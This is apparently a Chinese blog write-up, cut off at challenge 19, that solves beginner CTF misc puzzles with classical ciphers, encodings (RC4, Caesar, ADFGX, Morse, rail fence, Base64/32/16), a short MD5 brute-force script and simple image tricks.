<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#107;&amp;#101;&amp;#121;&amp;#123;&amp;#122;&amp;#45;&amp;#110;&amp;#115;&amp;#100;&amp;#105;&amp;#117;&amp;#97;&amp;#125;</span><br></pre></td></tr></tbody></table></figure><blockquote><p>在网上搜一个Unicode码解码工具（<a href="https://www.toolhelper.cn/EncodeDecode/UnicodeChinese">Unicode与中文 编码/解码 - 锤子在线工具 (toolhelper.cn)</a> ，并解码</p></blockquote><p>  <img src="https://pic.imgdb.cn/item/66571e63d9c307b7e94a21a2.png" alt="解码"></p><blockquote><p>得到flag</p></blockquote>  <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key{z-nsdiua}</span><br></pre></td></tr></tbody></table></figure></li></ul><h2 id="（2）杂项2：密文在这里-看看你是否能解开"><a href="#（2）杂项2：密文在这里-看看你是否能解开" class="headerlink" title="（2）杂项2：密文在这里,看看你是否能解开"></a>（2）杂项2：密文在这里,看看你是否能解开</h2><p><img src="https://pic.imgdb.cn/item/66572105d9c307b7e94cc375.png"></p><p>==RC4原理：==</p><p>RC4（Rivest Cipher 4）是一种流密码（stream cipher）算法，用于加密和解密数据。它由Ron Rivest设计并于1987年发布。RC4算法的核心是通过对称密钥生成伪随机位流（pseudo-random stream），然后将明文与该位流进行抑或（XOR）运算来实现加密和解密。</p><p>具体来说，RC4算法包括以下步骤：</p><ol><li><strong>密钥调度算法（Key Scheduling Algorithm，KSA）</strong>：根据输入的密钥，生成一个密钥调度表（S-box），用于后续的伪随机位流生成。</li><li><strong>伪随机生成算法（Pseudo-Random Generation Algorithm，PRGA）</strong>：利用密钥调度表生成一个伪随机位流，该位流的元素会被用作加密过程中的“密钥流”。</li><li><strong>加密/解密</strong>：将明文与伪随机位流进行逐位的抑或运算，以实现加密或解密操作。</li></ol><p>在使用RC4算法时，需要注意以下几点：</p><ul><li>密钥的选择和管理非常重要，弱密钥会导致加密的不安全性。</li><li>加密和解密使用相同的密钥。</li><li>在实际应用中，通常需要引入初始化向量（Initialization Vector，IV）来提高安全性。</li></ul><p>总的来说，RC4算法是一种快速且简单的加密算法，但由于存在一些安全性方面的问题，如密钥漏洞和偏差等，现在已不推荐作为加密标准使用。</p><ul><li><p>步骤：</p><blockquote><p>RC4解密是需要密钥的，所以需要寻找密钥，题中一个声音在耳边响起，看一下自己的键盘，他好像在组成某种神秘的组合（rtygcvb ，ujmko，ujmko），跟着他的字母在键盘上对一下，于是前两个组成了两个字母</p></blockquote></li></ul><p><img src="https://pic.imgdb.cn/item/665723b9d9c307b7e94fbc8b.jpg"></p><blockquote><p>重复敲击两次，那么猜测密钥为zvvzvv,并在网上找一个RC4解密工具解密（<a href="https://www.lddgo.net/encrypt/rc4">在线RC4加密解密 (lddgo.net)</a>）</p></blockquote><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">密文：M6UUSlt6rxWO328Kez8xXCMd</span><br></pre></td></tr></tbody></table></figure><blockquote><p>输入密钥，将字符集选择为UTF-8，输入格式为base64，输出格式为字符串（string）</p></blockquote><p><img src="https://pic.imgdb.cn/item/665725e7d9c307b7e9521dbe.png" alt="RC4解密"></p><blockquote><p>得到flag</p></blockquote><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key{zkz-good-kkey}</span><br></pre></td></tr></tbody></table></figure><h2 id="（3）杂项3：一段特殊的ascii密文"><a href="#（3）杂项3：一段特殊的ascii密文" class="headerlink" title="（3）杂项3：一段特殊的ascii密文"></a>（3）杂项3：一段特殊的ascii密文</h2><p><img src="https://pic.imgdb.cn/item/665726bdd9c307b7e953599f.png"></p><ul><li>步骤：</li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">83,121,110,116,71,115,121,110,116,136,135,120,135,108,110,126,115,112,63,61,63,62,108,67,63,69,108,76,76,76,76,138,90,113,66,71,112,110,66,62,62,67,112,112,66,111,112,67,113,63,110,114,69,66,65,110,111,111,113,68,61,63,112,69,68,68,68</span><br></pre></td></tr></tbody></table></figure><blockquote><p>首先，猜测flag是以“flag”开头的，且121,110,116三个数在2，3，4位置和在7，8，9位置都在，那么先将flag转换为ascii码，为102，108，97，103，</p><p>102（+6）108（-11）97（+6）103</p><p>121（-11）110（+6）116</p><p>那么可以看出108，97，103和121，110，116之间的差距是相同的，那么121-108=13，将所有数字-13</p></blockquote><blockquote><p>那么写一个python代码，将这些整数转化为ascii码</p></blockquote><p><img src="https://pic.imgdb.cn/item/66572bf9d9c307b7e95b1749.png" alt="代码运行图"></p><p>代码：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">a=[<span class="number">83</span>,<span class="number">121</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">71</span>,<span class="number">115</span>,<span class="number">121</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">136</span>,<span class="number">135</span>,<span class="number">120</span>,<span class="number">135</span>,</span><br><span class="line">   <span class="number">108</span>,<span class="number">110</span>,<span class="number">126</span>,<span class="number">115</span>,<span class="number">112</span>,<span class="number">63</span>,<span class="number">61</span>,<span class="number">63</span>,<span class="number">62</span>,<span class="number">108</span>,<span class="number">67</span>,<span class="number">63</span>,<span class="number">69</span>,<span class="number">108</span>,</span><br><span class="line">   <span class="number">76</span>,<span class="number">76</span>,<span class="number">76</span>,<span class="number">76</span>,<span class="number">138</span>,<span class="number">90</span>,<span class="number">113</span>,<span class="number">66</span>,<span class="number">71</span>,<span class="number">112</span>,<span class="number">110</span>,<span class="number">66</span>,<span class="number">62</span>,<span class="number">62</span>,<span class="number">67</span>,</span><br><span class="line">   <span class="number">112</span>,<span class="number">112</span>,<span class="number">66</span>,<span class="number">111</span>,<span class="number">112</span>,<span class="number">67</span>,<span class="number">113</span>,<span class="number">63</span>,<span class="number">110</span>,<span class="number">114</span>,<span class="number">69</span>,<span class="number">66</span>,<span class="number">65</span>,<span class="number">110</span>,</span><br><span class="line">   <span class="number">111</span>,<span class="number">111</span>,<span class="number">113</span>,<span class="number">68</span>,<span class="number">61</span>,<span class="number">63</span>,<span class="number">112</span>,<span class="number">69</span>,<span class="number">68</span>,<span class="number">68</span>,<span class="number">68</span>]</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    j = <span class="built_in">chr</span>(i-<span class="number">13</span>)</span><br><span class="line">    <span class="comment"># chr()函数用于返回指定整数对应的ASCII字符</span></span><br><span class="line">    flag=flag+j</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></tbody></table></figure><blockquote><p>得到部分的flag，md5值其实最后还有个d，这个d其实也是可以跑出来的</p></blockquote><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Flag:flag{zkz_aqfc2021_628_????}Md5:ca5116cc5bc6d2ae854abbd702c8777d</span><br></pre></td></tr></tbody></table></figure><blockquote><p>这里的一个思路就是尝试用md5解密工具（<a href="https://www.cmd5.com/default.aspx">md5在线解密破解,md5解密加密 (cmd5.com)</a>），但是是不成功的，因为数据源是无穷尽的，而 MD5密文是有限的。</p><p>那么这里我就查看了平台的解题思路：标准的md5碰撞，写一个碰撞脚本（碰撞需要一段时间，耐心等待）</p></blockquote><p><img src="https://pic.imgdb.cn/item/66573179d9c307b7e961bb4b.png" alt="MD5碰撞脚本运行"></p><p>代码：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">flag_md5 = 'ca5116cc5bc6d2ae854abbd702c8777d'</span><br><span class="line">strs = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&amp;()" \</span><br><span class="line">       "*+,-./:;&lt;=&gt;?@[\]^_`{|}~ "</span><br><span class="line">for a in strs:</span><br><span class="line">    for b in strs:</span><br><span class="line">        for c in strs:</span><br><span class="line">            for d in strs:</span><br><span class="line">                md5 = hashlib.md5()</span><br><span class="line">                flag = 'flag{zkz_aqfc2021_628_' +str(a)+str(b)+str(c)+str(d)+'}'</span><br><span class="line">                md5.update(flag.encode())</span><br><span class="line">                if md5.hexdigest() == flag_md5:</span><br><span class="line">                    print(flag)</span><br></pre></td></tr></tbody></table></figure><blockquote><p>得到flag</p></blockquote><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag{zkz_aqfc2021_628_zxcv}</span><br></pre></td></tr></tbody></table></figure><h3 id="杂项3学习资料补充"><a href="#杂项3学习资料补充" class="headerlink" title="杂项3学习资料补充"></a>杂项3学习资料补充</h3><p>==hashlib库==</p><ul><li><p>hashlib库是Python的一个标准库，用于提供哈希算法。其中包含多种哈希算法，如MD5、SHA-1、SHA-256等。</p></li><li><p>MD5 (Message Digest Algorithm 5) 是一种广泛使用的哈希算法，用于将任意长度的输入数据生成一个128位的哈希值。它具有以下特点：</p><ol><li><p>不可逆：无法从生成的哈希值还原出原始数据。</p></li><li><p>唯一性：不同的输入数据生成的哈希值几乎不会相同。</p></li><li><p>高效性：计算速度快，适合用于检查数据完整性。</p></li></ol></li></ul><p>在Python中，可以使用<code>hashlib</code>库中的<code>md5()</code>函数来计算数据的MD5哈希值，示例代码如下：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">data = <span class="string">'Hello, World!'</span></span><br><span class="line">md5_hash = hashlib.md5(data).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"MD5 hash value:"</span>, md5_hash)</span><br></pre></td></tr></tbody></table></figure><p>这段代码会计算字符串<code>'Hello, World!'</code>的MD5哈希值，并打印出该哈希值。</p><p><code>hexdigest()</code>是<code>hashlib</code>库中<code>hash</code>对象的一个方法，用于获取以十六进制表示的哈希值。在计算完哈希值之后，可以使用<code>hexdigest()</code>方法将哈希值转换为字符串形式，方便输出或者存储。这样可以避免直接输出二进制形式的哈希值，使得结果更易读和使用。</p><h2 id="（4）杂项4：一个加密的xlsx表格"><a href="#（4）杂项4：一个加密的xlsx表格" class="headerlink" title="（4）杂项4：一个加密的xlsx表格"></a>（4）杂项4：一个加密的xlsx表格</h2><p><img src="https://pic.imgdb.cn/item/665734d3d9c307b7e96603a0.png"></p><blockquote><p>打开传送门后，想要下载表格就需要密码</p></blockquote><p><img src="https://pic.imgdb.cn/item/66573901d9c307b7e96c4d91.png"></p><blockquote><p>尝试用文本文档（txt）打开寻找线索，真就发现了线索</p></blockquote><p><img src="https://pic.imgdb.cn/item/665739a2d9c307b7e96d1572.png"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag{asd}</span><br></pre></td></tr></tbody></table></figure><h2 id="（5）杂项5：刚刚截获德军的密电"><a href="#（5）杂项5：刚刚截获德军的密电" class="headerlink" title="（5）杂项5：刚刚截获德军的密电"></a>（5）杂项5：刚刚截获德军的密电</h2><p><img src="https://pic.imgdb.cn/item/66573d4ad9c307b7e9716e07.png"></p><p>==ADFGX古典密码==<br>　　1918年，第一次世界大战将要结束时，法军截获了一份德军电报，电文中的所有单词都由A、D、F、G、X五个字母拼成，因此被称为ADFGX密码。ADFGX密码是1918年3月由德军上校Fritz Nebel发明的，是结合了Polybius密码和置换密码的双重加密方案。<br>　　A、D、F、G、X即Polybius方阵中的前5个字母。 </p><p>　　明文：A T T A C K A T O N C E<br>　　经过Polybius变换：AF AD AD AF GF DX AF AD DF FX GF XF </p><blockquote><p>按照表进行转换：<img src="https://pic.imgdb.cn/item/665ddc6e5e6d1bfa054bb957.png" style="zoom:50%;"></p></blockquote><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">密文：FA XX DD AG DD XA FF FF AX DX</span><br></pre></td></tr></tbody></table></figure><blockquote><p>第一个字母为行数，第二个字母为列数，转换后</p></blockquote><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">明文：flagabxxmo</span><br></pre></td></tr></tbody></table></figure><h2 id="（6）杂项6：简单加密"><a href="#（6）杂项6：简单加密" class="headerlink" title="（6）杂项6：简单加密"></a>（6）杂项6：简单加密</h2><p><img src="https://pic.imgdb.cn/item/665dde1e5e6d1bfa054dcabc.png"></p><blockquote><p>synt一看联想到凯撒密码，f与s偏移13位，直接上工具（<a href="https://www.lddgo.net/encrypt/caesar-cipher">在线凯撒密码加密解密 (lddgo.net)</a>）</p></blockquote><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">密文：synt{mxnd_pgs_xxxebg13}</span><br></pre></td></tr></tbody></table></figure><p><img src="https://pic.imgdb.cn/item/665ddf485e6d1bfa054f841c.png"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">明文：flag{zkaq_ctf_kkkrot13}</span><br></pre></td></tr></tbody></table></figure><h2 id="（7）杂项7：社会主义核心价值观"><a href="#（7）杂项7：社会主义核心价值观" class="headerlink" title="（7）杂项7：社会主义核心价值观"></a>（7）杂项7：社会主义核心价值观</h2><p><img src="https://pic.imgdb.cn/item/665de01e5e6d1bfa0550f8e8.png"></p><blockquote><p>核心价值观加解密平台：（<a href="http://www.hiencode.com/cvencode.html">CTF在线工具-在线核心价值观编码|核心价值观编码算法|Core Values Encoder (hiencode.com)</a>）</p></blockquote><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">密文：公正公正公正诚信文明公正民主公正法治法治诚信民主法治诚信富强公正友善平等公正民主法治民主平等友善敬业法治和谐公正爱国法治诚信富强法治敬业公正爱国平等友善敬业和谐公正和谐富强和谐公正法治诚信和谐</span><br></pre></td></tr></tbody></table></figure><p><img src="https://pic.imgdb.cn/item/665de7605e6d1bfa0559e813.png"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">明文：flag{zkaq_shzyh_606}</span><br></pre></td></tr></tbody></table></figure><h2 id="（8）杂项8：奇怪的短信"><a href="#（8）杂项8：奇怪的短信" class="headerlink" title="（8）杂项8：奇怪的短信"></a>（8）杂项8：奇怪的短信</h2><p><img src="https://pic.imgdb.cn/item/665de7c25e6d1bfa055a4a31.png"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">密文：33 53 21 41 94 52 21 72 74 42</span><br></pre></td></tr></tbody></table></figure><blockquote><p>手机上发短信有9键和26键，肯定不是和26键有关，考虑9键，</p></blockquote><p>看一个9键键盘：</p><img src="https://pic.imgdb.cn/item/665de8a65e6d1bfa055c4ced.jpg" style="zoom: 33%;"><blockquote><p>第一个字母首先考虑f，则看出33，就是“3”的第三个字母，推出密文:</p></blockquote><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">密文：flagzkaqsh</span><br></pre></td></tr></tbody></table></figure><h2 id="（9）杂项9：SOS的求救信息"><a href="#（9）杂项9：SOS的求救信息" class="headerlink" title="（9）杂项9：SOS的求救信息"></a>（9）杂项9：SOS的求救信息</h2><p><img src="https://pic.imgdb.cn/item/665de9b85e6d1bfa055e0252.png"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">密文：</span><br><span class="line">..-.</span><br><span class="line">....</span><br><span class="line">..-.</span><br><span class="line">.-..</span><br><span class="line">--.-</span><br><span class="line">.-</span><br><span class="line">.-</span><br><span class="line">--.</span><br><span class="line">-.-.</span><br><span class="line">--..</span><br><span class="line">--.</span><br><span class="line">-.-</span><br><span class="line">.-</span><br><span class="line">--..</span><br><span class="line">.-..</span><br></pre></td></tr></tbody></table></figure><blockquote><p>一眼得摩斯电码，查表解决</p></blockquote><p><img src="https://pic.imgdb.cn/item/665dea305e6d1bfa055e84cf.png" alt="摩斯电码表"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">解密得：fhflqaagczgkazl</span><br></pre></td></tr></tbody></table></figure><blockquote><p>这个密码具备f、l、a、g，只是顺序有问题，考虑栅栏加密</p></blockquote><p>==栅栏加密：==</p><p>​        所谓的栅栏密码，就是将一段被加密的明文划分成N个组，然后取每个组的第1个字符，根据情况排列成一段话，特点相对简单，字母不会太多。</p><p>1、加密原理：</p><p>例如明文：THIS IS ZHISHITOM<br>去掉空格吧还是：THISISZHISHITOM<br>设置栏数为3加密：TSHHZIIHTSIOISM<br>下面分解一下加密过程（分为3组）:<br>第一组：T H I S I<br>第二组：S Z H I S<br>第三组：H I T O M<br>然后按列取出字母：TSH HZI IHT SIO ISM<br>然后连在一起就形成了加密：TSHHZIIHTSIOISM</p><p>2、解密原理<br>明确了加密的过程，下面逆推就行<br>加密明文：TSHHZIIHTSIOISM<br>先划分：<br>T S H<br>H Z I<br>I H T<br>S I O<br>I S M<br>按列顺序取字母：THISISZHISHITOM<br>完成了解密。<br>原文链接：<a href="https://blog.csdn.net/Makboli/article/details/126464442">https://blog.csdn.net/Makboli/article/details/126464442</a></p><p>栅栏加解密平台：（<a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php">栅栏密码在线加密解密 - 千千秀字 (qqxiuzi.cn)</a>）</p><p><img src="https://pic.imgdb.cn/item/665df04d5e6d1bfa0564e571.png"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">解出的明文：flagzkzhqacgalf</span><br></pre></td></tr></tbody></table></figure><blockquote><p>但是仍未通过，查看解析发现flag是需要将他倒置才可以</p></blockquote><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">提交flag：flagcaqhzkzgalf</span><br></pre></td></tr></tbody></table></figure><h2 id="（10）杂项10：Base"><a href="#（10）杂项10：Base" class="headerlink" title="（10）杂项10：Base"></a>（10）杂项10：Base</h2><p><img src="https://pic.imgdb.cn/item/665df2705e6d1bfa0566e1ce.png"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">密文：RzVBVE1RUlhJRTNER05aVUdZM0RPUVJXR0kzRENOWlRHWTJUR05SVEdRMlVNTlJTR1lZVE9NWldHVVpUQ01aV0c1Q0E9PT09</span><br></pre></td></tr></tbody></table></figure><p>Base加解密平台：<a href="http://www.hiencode.com/base64.html">CTF在线工具-在线base编码|在线base解码|base16编码|base32编码|base64编码 (hiencode.com)</a></p><ul><li>Base64，包含大写字母（A-Z）,小写字母（a-z），数字（0-9）以及+/；</li><li>Base32，只有大写字母（A-Z）和数字234567；</li><li>Base16，只有16进制的数据，其范围是数字(0-9)，字母（ABCDEF）。</li></ul><blockquote><p>该密文有小写所以为Base64</p></blockquote><p><img src="https://pic.imgdb.cn/item/665df4e75e6d1bfa05691bbd.png" alt="Base64解密"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Base64解密后：G5ATMQRXIE3DGNZUGY3DOQRWGI3DCNZTGY2TGNRTGQ2UMNRSGYYTOMZWGUZTCMZWG5CA====</span><br></pre></td></tr></tbody></table></figure><blockquote><p>解密后只有大写和数字234567，判断为Base32，继续解密</p></blockquote><p><img src="https://pic.imgdb.cn/item/665df54b5e6d1bfa056980e9.png" alt="Base32解密"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Base32解密后：7A6B7A6374667B6261736536345F6261736531367D</span><br></pre></td></tr></tbody></table></figure><blockquote><p>此时只有16进制的数据，其范围是数字(0-9)和字母</p></blockquote><p><img src="https://pic.imgdb.cn/item/665df5fb5e6d1bfa056a19a8.png" alt="Base16解密"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">得到flag：zkzctf{base64_base16}</span><br></pre></td></tr></tbody></table></figure><h2 id="（11）杂项11：这是我最喜欢的女明星"><a href="#（11）杂项11：这是我最喜欢的女明星" class="headerlink" title="（11）杂项11：这是我最喜欢的女明星"></a>（11）杂项11：这是我最喜欢的女明星</h2><p><img src="https://pic.imgdb.cn/item/665df6645e6d1bfa056a6e0d.png"></p><blockquote><p>第一反应是像之前一样下载下来用txt打开找flag，但是发现有太多信息了，找不到，于是回去看了解析，居然是用试图软件去识别图片人物啊！</p><p>百度识图：<a href="https://graph.baidu.com/pcpage/index?tpl_from=pc">https://graph.baidu.com/pcpage/index?tpl_from=pc</a></p></blockquote><p><img src="https://pic.imgdb.cn/item/665df7ac5e6d1bfa056cf802.png"></p><blockquote><p>那这个女神就是邱淑贞了，那就去查一查她的英文名吧！</p><p>flag：Chingmy Yau</p></blockquote><h2 id="（12）杂项12：打由诗"><a href="#（12）杂项12：打由诗" class="headerlink" title="（12）杂项12：打由诗"></a>（12）杂项12：打由诗</h2><p><img src="https://pic.imgdb.cn/item/665df82f5e6d1bfa056d600b.png"></p><blockquote><p>在网上查找得知此为当铺密码，将其每个字都转换为数字</p></blockquote><p>==当铺密码==：</p><p>当前汉字有多少笔画出头，就是转化成数字几。例如：</p><p>王：该字外面有 6 个出头的位置，所以该汉字对应的数字就是 6；</p><p>口：该字外面没有出头的位置，那就是0；</p><p>人：该字外面有 3 个出头的位置，所以该汉字对应的数字就是 3；</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">密文：由口中,由口井,圭土,由口人,由中人,由中中,由口主,由中中,圭土,由凹凸,由由中,由目圭,克工</span><br></pre></td></tr></tbody></table></figure><blockquote><p>将其转换为数字，并用ASCII码解开</p></blockquote><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">明文：102 108 97 103 123 122 107 122 95 100 112 109 109 54</span><br><span class="line">flag{zkz_dpm6}</span><br></pre></td></tr></tbody></table></figure><h2 id="（13）杂项13：佛说"><a href="#（13）杂项13：佛说" class="headerlink" title="（13）杂项13：佛说"></a>（13）杂项13：佛说</h2><p><img src="https://pic.imgdb.cn/item/66681165d9c307b7e9d315a4.png"></p><blockquote><p>网上查看其为与佛论禅，那就寻找工具解密</p></blockquote><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">密文：佛曰：諳娑蒙罰世那真耶除梵沙缽能蒙切一怯南缽爍皤若佛涅無侄殿依缽以俱耨皤大缽若道他怯數等侄即喝至能楞怯伊奢阿諳利哆跋遮知智罰悉缽伽即所遠那等多</span><br></pre></td></tr></tbody></table></figure><blockquote><p>解密工具：<a href="https://ctf.bugku.com/tool/todousharp">与佛论禅密码 - Bugku CTF</a></p></blockquote><p><img src="https://pic.imgdb.cn/item/6668112dd9c307b7e9d27154.png"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag{zkaq_fochan}</span><br></pre></td></tr></tbody></table></figure><h2 id="（14）杂项14-奇怪的Base加密"><a href="#（14）杂项14-奇怪的Base加密" class="headerlink" title="（14）杂项14:奇怪的Base加密"></a>（14）杂项14:奇怪的Base加密</h2><p><img src="https://pic.imgdb.cn/item/666811c2d9c307b7e9d3e30f.png"></p><blockquote><p>下载文件，这么长的一段Base,还有;base64,这个关键词，这个一定是图片Base64加密，直接解密就可以了</p><p>加解密平台：<a href="https://tool.chinaz.com/tools/imgtobase/">https://tool.chinaz.com/tools/imgtobase/</a></p><p>记得加一个头部图片的格式：data:image/jpg；</p></blockquote><p><img src="https://pic.imgdb.cn/item/6668137bd9c307b7e9d86cea.png"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag{base64_tupian_a}</span><br></pre></td></tr></tbody></table></figure><h2 id="（15）杂项15：跳舞小人"><a href="#（15）杂项15：跳舞小人" class="headerlink" title="（15）杂项15：跳舞小人"></a>（15）杂项15：跳舞小人</h2><p><img src="https://pic.imgdb.cn/item/666813f5d9c307b7e9d9652a.png"></p><blockquote><p>跳舞小人中明显有一个二维码，截图发现少了一块，补上直接扫描</p></blockquote><p>得到flag</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag{GC-ACUID}</span><br></pre></td></tr></tbody></table></figure><h2 id="（16）杂项16：神秘图片"><a href="#（16）杂项16：神秘图片" class="headerlink" title="（16）杂项16：神秘图片"></a>（16）杂项16：神秘图片</h2><p><img src="https://pic.imgdb.cn/item/666815bbd9c307b7e9dbb43c.png"></p><blockquote><p>下载文件，然后右键属性，看到里面的照相机镜头信息</p></blockquote><img src="https://pic.imgdb.cn/item/66681627d9c307b7e9dc292f.png" style="zoom:67%;"><p>得到flag</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag{ctf_tupian_666}</span><br></pre></td></tr></tbody></table></figure><h2 id="（17）杂项17-可达鸭"><a href="#（17）杂项17-可达鸭" class="headerlink" title="（17）杂项17:可达鸭"></a>（17）杂项17:可达鸭</h2><p><img src="https://pic.imgdb.cn/item/6668171bd9c307b7e9dd3a34.png"></p><blockquote><p>看到图片明显能感觉到显示不全，下载发现是一个png图片</p></blockquote><p><img src="https://pic.imgdb.cn/item/66681fbcd9c307b7e9e57207.png"></p><blockquote><p>自然就想到利用16进制编辑器打开图片，到找IHDR调整大小，发现后面的flag，可以使用网上的16进制编辑器，把图片长度更改；工具：<a href="https://hexed.it/">HexEd.it — 基于浏览器的十六进制编辑器</a></p></blockquote><p><img src="https://pic.imgdb.cn/item/66682061d9c307b7e9e74795.png"></p><p>更改为：</p><p><img src="https://pic.imgdb.cn/item/66682085d9c307b7e9e7996d.png"></p><p>得到图片：</p><img src="https://pic.imgdb.cn/item/666820bad9c307b7e9e7d4ea.png" style="zoom:50%;"><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag{ke-da-ya!}</span><br></pre></td></tr></tbody></table></figure><h2 id="（18）杂项18：一组神秘的图片"><a href="#（18）杂项18：一组神秘的图片" class="headerlink" title="（18）杂项18：一组神秘的图片"></a>（18）杂项18：一组神秘的图片</h2><p><img src="https://pic.imgdb.cn/item/66682115d9c307b7e9e85cc0.png"></p><blockquote><p>下载压缩包，解压之后得到一些黑白图，这个图片只有黑和白两种，有点像二进制中的0和1，尝试把白色换成0，黑色换成1，得出一串二进制</p></blockquote><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">二进制：01100110011011000110000101100111011110110110011100101101011000110110011101111101</span><br></pre></td></tr></tbody></table></figure><p><img src="https://pic.imgdb.cn/item/66682247d9c307b7e9ea346c.png"></p><blockquote><p>将其转换为ASCII码，工具：<a href="https://coding.tools/cn/binary-to-text">2进制到ASCII字符串在线转换工具 - Coding.Tools</a></p></blockquote><p><img src="https://pic.imgdb.cn/item/666822f5d9c307b7e9eae9a2.png"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag{g-cg}</span><br></pre></td></tr></tbody></table></figure><h2 id="（19）杂项19：神奇的压缩包加密"><a href="#（19）杂项19：神奇的压缩包加密" class="headerlink" title="（19）杂项19：神奇的压缩包加密"></a>（19）杂项19：神奇的压缩包加密</h2><p><img src="https://pic.imgdb.cn/item/66682384d9c307b7e9eb7a3d.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF练习 </category>
          
      </categories>
      
      
        <tags>
